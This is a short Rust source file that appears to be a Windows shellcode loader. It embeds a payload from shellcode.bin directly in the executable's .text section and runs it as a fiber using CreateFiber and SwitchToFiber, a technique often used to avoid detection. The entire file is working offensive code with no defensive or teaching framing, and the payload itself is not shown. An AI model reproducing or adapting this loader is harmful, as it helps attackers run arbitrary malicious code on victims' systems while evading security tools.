#![allow(deprecated)]

use std::{mem::transmute, ptr::null};

use windows_sys::Win32::System::Threading::{
    ConvertFiberToThread, ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
};

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

// fn pause() {
//     println!("[*] Press Enter to continue...");
//     let mut input = String::new();
//     std::io::stdin().read_line(&mut input).unwrap();
// }

fn main() {
    let shellcode_ptr = SHELLCODE.as_ptr() as *mut u8;

    unsafe {
        let main_thread = ConvertThreadToFiber(null());

        println!("[+] Converted main thread to fiber: {:?}", main_thread);

        let fiber = CreateFiber(0, transmute(shellcode_ptr), std::ptr::null_mut());

        if fiber.is_null() {
            println!("[!] Failed to create fiber");
            return;
        }

        SwitchToFiber(fiber);

        DeleteFiber(fiber);
        ConvertFiberToThread();
    }

    return;
}
